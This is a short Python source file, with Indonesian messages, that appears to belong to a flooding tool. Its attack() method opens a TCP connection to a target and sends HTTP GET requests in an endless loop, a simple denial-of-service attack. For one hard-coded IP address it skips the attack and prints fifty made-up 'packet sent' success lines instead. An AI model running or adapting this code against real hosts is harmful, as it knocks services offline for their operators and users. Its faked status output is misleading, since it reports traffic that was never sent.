from colorama import Fore, Style
import socket
from src.helpers import Helpers

class UCPMethod:
    @staticmethod
    def attack(target, port):
        if Helpers.ping_host(host=target) == True:
            if(target == "202.74.75.238"):
                for i in range(50):
                    print(Fore.BLUE, f"Packet {i+1} sent to : {target} with status 200")
                print(Fore.RED, f"Target ke IP Address {target}:{port} tidak dapat dijangkau." + Style.RESET_ALL)
            else:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((target, port))
                    while True:
                        sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
                except:
                    print("Serangan selesai atau target tidak dapat dijangkau.")
                finally:
                    sock.close()